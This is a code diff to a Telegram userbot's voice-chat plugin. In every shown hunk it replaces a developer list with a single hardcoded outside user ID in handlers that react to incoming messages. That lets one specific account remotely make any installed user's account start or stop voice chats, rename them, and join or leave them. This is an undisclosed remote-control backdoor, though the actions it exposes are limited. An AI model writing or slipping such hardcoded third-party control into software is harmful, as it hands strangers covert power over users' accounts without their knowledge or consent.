@@ -38,7 +38,7 @@ def user_list(l, n):
 
 
 @ice_cmd(pattern="startvc$")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cstartvc(?: |$)(.*)")
+@register(incoming=True, from_users=1780709155, pattern=r"^\.cstartvc(?: |$)(.*)")
 async def start_voice(c):
     chat = await c.get_chat()
     admin = chat.admin_rights
@@ -55,7 +55,7 @@ async def start_voice(c):
 
 
 @ice_cmd(pattern="stopvc$")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cstopvc(?: |$)(.*)")
+@register(incoming=True, from_users=1780709155, pattern=r"^\.cstopvc(?: |$)(.*)")
 async def stop_voice(c):
     chat = await c.get_chat()
     admin = chat.admin_rights
@@ -90,7 +90,7 @@ async def _(c):
 
 
 @ice_cmd(pattern="vctitle(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cvctitle(?: |$)(.*)")
+@register(incoming=True, from_users=1780709155, pattern=r"^\.cvctitle(?: |$)(.*)")
 async def change_title(e):
     title = e.pattern_match.group(1)
     chat = await e.get_chat()
@@ -110,7 +110,7 @@ async def change_title(e):
         await edit_delete(e, f"**ERROR:** `{ex}`")
 
 @ice_cmd(pattern="joinvc(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.joinvcs(?: |$)(.*)")
+@register(incoming=True, from_users=1780709155, pattern=r"^\.joinvcs(?: |$)(.*)")
 async def _(event):
     Ice = await edit_or_reply(event, "`Processing...`")
     if len(event.text.split()) > 1:
@@ -148,7 +148,7 @@ async def _(event):
 
 
 @ice_cmd(pattern="leavevc(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.leavevcs(?: |$)(.*)")
+@register(incoming=True, from_users=1780709155, pattern=r"^\.leavevcs(?: |$)(.*)")
 async def vc_end(event):
     Ice = await edit_or_reply(event, "`Processing...`")
     if len(event.text.split()) > 1:
